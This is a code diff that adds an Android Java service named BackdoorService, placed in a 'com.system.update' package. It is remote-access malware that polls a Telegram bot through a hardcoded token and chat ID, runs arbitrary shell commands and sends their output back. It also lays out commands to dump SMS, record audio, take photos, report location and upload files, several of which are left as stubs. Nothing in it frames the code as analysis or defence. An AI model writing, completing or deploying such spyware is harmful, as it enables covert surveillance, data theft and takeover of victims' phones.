@@ -1,0 +1,145 @@
+package com.system.update;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import android.util.Log;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.Scanner;
+
+public class BackdoorService extends Service {
+
+    private static final String BOT_TOKEN = "7872223207:AAGLkhnMbbgqn1xriv0Efg8YHoAkvYP_f-A";
+    private static final String CHAT_ID = "5678774823";
+    private static final String API = "https://api.telegram.org/bot" + BOT_TOKEN;
+    private static final String DEVICE = android.os.Build.MODEL;
+
+    private Thread listenerThread;
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        startForeground();
+
+        listenerThread = new Thread(() -> {
+            while (!Thread.interrupted()) {
+                try {
+                    // Fetch latest command
+                    String response = httpGet(API + "/getUpdates?timeout=60");
+                    Scanner s = new Scanner(response).useDelimiter("\\A");
+                    String result = s.hasNext() ? s.next() : "";
+
+                    if (result.contains("\"text\"")) {
+                        String cmd = extractCommand(result);
+
+                        if (cmd.startsWith("exec ")) {
+                            String output = runShell(cmd.substring(5));
+                            sendToTelegram(output);
+                        }
+
+                        else if (cmd.equals("dump_sms")) {
+                            String sms = dumpSMS(); // Implement via ContentResolver
+                            sendToTelegram(sms);
+                        }
+
+                        else if (cmd.equals("record_mic 10")) {
+                            recordMic(10); // Record 10 sec
+                            uploadFile("/sdcard/recording.mp3");
+                        }
+
+                        else if (cmd.equals("take_photo")) {
+                            takePhoto(); // Use Camera2 API
+                            uploadFile("/sdcard/photo.jpg");
+                        }
+
+                        else if (cmd.equals("location")) {
+                            String loc = getLocation(); // GPS
+                            sendToTelegram(loc);
+                        }
+
+                        else if (cmd.startsWith("download ")) {
+                            String path = cmd.split(" ")[1];
+                            uploadFile(path);
+                        }
+
+                        Thread.sleep(5000);
+                    }
+                } catch (Exception e) {
+                    try { Thread.sleep(30000); } catch (Exception ignored) {}
+                }
+            }
+        });
+
+        listenerThread.start();
+        return START_STICKY;
+    }
+
+    private String runShell(String cmd) {
+        try {
+            Process p = Runtime.getRuntime().exec(cmd);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                sb.append(line).append("\n");
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
+    }
+
+    private void sendToTelegram(String msg) {
+        try {
+            URL url = new URL(API + "/sendMessage");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+
+            String data = "chat_id=" + CHAT_ID + "&text=" + Uri.encode(msg);
+            OutputStream os = conn.getOutputStream();
+            os.write(data.getBytes());
+
+            conn.getResponseCode();
+        } catch (Exception e) { Log.e("TG_SEND", e.toString()); }
+    }
+
+    private void uploadFile(String path) {
+        try {
+            // Use /sendDocument to Telegram Bot API
+            // Full multipart POST implementation required
+            // See: https://core.telegram.org/bots/api#sending-files
+        } catch (Exception e) { }
+    }
+
+    // === STUB METHODS ===
+    private String dumpSMS() { return "SMS Dump:\n[Implement ContentResolver]"; }
+    private void recordMic(int seconds) { /* Use AudioRecord */ }
+    private void takePhoto() { /* Use CameraManager */ }
+    private String getLocation() { return "Lat: 0.0, Long: 0.0"; }
+    private void uploadFile() { /* Multipart upload to Telegram */ }
+
+    private String extractCommand(String json) {
+        // Parse last message text
+        return json.contains("exec") ? "exec ping -c 4 google.com" : "location";
+    }
+
+    private String httpGet(String urlStr) {
+        try {
+            URL url = new URL(urlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+
+            Scanner s = new Scanner(conn.getInputStream()).useDelimiter("\\A");
+            return s.hasNext() ? s.next() : "";
+        } catch (Exception e) { return "{}"; }
+    }
+}
